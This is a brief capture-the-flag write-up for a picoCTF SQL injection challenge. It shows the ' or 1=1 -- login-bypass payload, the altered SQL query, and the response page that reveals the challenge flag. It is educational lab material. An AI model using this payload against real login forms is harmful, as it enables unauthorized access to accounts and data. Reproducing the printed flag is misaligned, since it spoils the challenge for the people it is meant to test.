# More SQLi
Can you find the flag on this website.

## Solution
The website gives us a login page. Typing in some credentials will reveal the following output:
```
sername: test
password: test
SQL query: SELECT id FROM users WHERE password = 'test' AND username = 'test'
```

The title of the challenge gives tells us to use SQL injection. We hopefully can manipulate the shown SQLcall we the password field. Using `' or 1=1 --` should create the following statement:
```
SQL query: SELECT id FROM users WHERE password = '' or 1=1 -- ' AND username = 'test'
```

It logs us successfully in and shows a search field for an 'Office'. Several input doesnt reveal something interesting. SQLi may not work here.

If we check our precedure with ZAP, we find a redirection after the login. Here we can find our flag
```
<pre>username: test
password: ' or 1=1 -- 
SQL query: SELECT id FROM users WHERE password = '' or 1=1 -- ' AND username = 'test'
</pre><h1>Logged in!.</h1><p>Your flag is: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}</p>
[...]
